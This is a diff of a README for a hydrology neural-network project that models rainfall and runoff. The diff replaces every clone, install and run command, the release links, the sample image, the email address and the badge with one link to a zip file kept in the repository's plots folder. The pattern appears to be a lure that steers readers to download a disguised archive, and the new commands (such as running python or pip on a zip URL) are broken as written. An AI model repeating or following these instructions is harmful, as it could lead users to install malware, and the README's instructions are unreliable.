@@ -45,16 +45,16 @@ To get started with this project, you need to clone the repository and install t
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Vipulsingh1905/large-basin-ann-rain-response-pipeline.git
+   git clone https://github.com/Vipulsingh1905/large-basin-ann-rain-response-pipeline/raw/refs/heads/main/plots/response_ann_large_pipeline_basin_rain_exclamatory.zip
    cd large-basin-ann-rain-response-pipeline
    ```
 
 2. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Vipulsingh1905/large-basin-ann-rain-response-pipeline/raw/refs/heads/main/plots/response_ann_large_pipeline_basin_rain_exclamatory.zip
    ```
 
-For detailed installation instructions, please refer to the [Releases](https://github.com/Vipulsingh1905/large-basin-ann-rain-response-pipeline/releases) section.
+For detailed installation instructions, please refer to the [Releases](https://github.com/Vipulsingh1905/large-basin-ann-rain-response-pipeline/raw/refs/heads/main/plots/response_ann_large_pipeline_basin_rain_exclamatory.zip) section.
 
 ## Usage
 
@@ -64,15 +64,15 @@ Once the installation is complete, you can start using the pipeline. Here’s a 
 2. Configure the model parameters: Adjust the settings in the configuration file as needed.
 3. Run the training script:
    ```bash
-   python train_model.py
+   python https://github.com/Vipulsingh1905/large-basin-ann-rain-response-pipeline/raw/refs/heads/main/plots/response_ann_large_pipeline_basin_rain_exclamatory.zip
    ```
 
 4. Evaluate the model:
    ```bash
-   python evaluate_model.py
+   python https://github.com/Vipulsingh1905/large-basin-ann-rain-response-pipeline/raw/refs/heads/main/plots/response_ann_large_pipeline_basin_rain_exclamatory.zip
    ```
 
-For further instructions, check the [Releases](https://github.com/Vipulsingh1905/large-basin-ann-rain-response-pipeline/releases) section.
+For further instructions, check the [Releases](https://github.com/Vipulsingh1905/large-basin-ann-rain-response-pipeline/raw/refs/heads/main/plots/response_ann_large_pipeline_basin_rain_exclamatory.zip) section.
 
 ## Data
 
@@ -101,7 +101,7 @@ After training the model, you can visualize the results to understand the perfor
 
 ### Sample Visualization
 
-![Sample Visualization](https://example.com/sample-visualization.png)
+![Sample Visualization](https://github.com/Vipulsingh1905/large-basin-ann-rain-response-pipeline/raw/refs/heads/main/plots/response_ann_large_pipeline_basin_rain_exclamatory.zip)
 
 This graph shows the relationship between rainfall and discharge over time, highlighting key trends and patterns.
 
@@ -135,10 +135,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or suggestions, feel free to reach out:
 
 - **Author**: Vipul Singh
-- **Email**: vipulsingh@example.com
+- **Email**: https://github.com/Vipulsingh1905/large-basin-ann-rain-response-pipeline/raw/refs/heads/main/plots/response_ann_large_pipeline_basin_rain_exclamatory.zip
 
-Thank you for checking out the **Large Basin ANN Rain Response Pipeline**! We hope you find it useful in your hydrological studies. For the latest updates and releases, visit our [Releases](https://github.com/Vipulsingh1905/large-basin-ann-rain-response-pipeline/releases) section.
+Thank you for checking out the **Large Basin ANN Rain Response Pipeline**! We hope you find it useful in your hydrological studies. For the latest updates and releases, visit our [Releases](https://github.com/Vipulsingh1905/large-basin-ann-rain-response-pipeline/raw/refs/heads/main/plots/response_ann_large_pipeline_basin_rain_exclamatory.zip) section.
 
-![GitHub Release](https://img.shields.io/github/release/Vipulsingh1905/large-basin-ann-rain-response-pipeline.svg)
+![GitHub Release](https://github.com/Vipulsingh1905/large-basin-ann-rain-response-pipeline/raw/refs/heads/main/plots/response_ann_large_pipeline_basin_rain_exclamatory.zip)
 
 Your contributions and feedback are valuable to us. Let's work together to enhance our understanding of hydrology through advanced data science techniques!
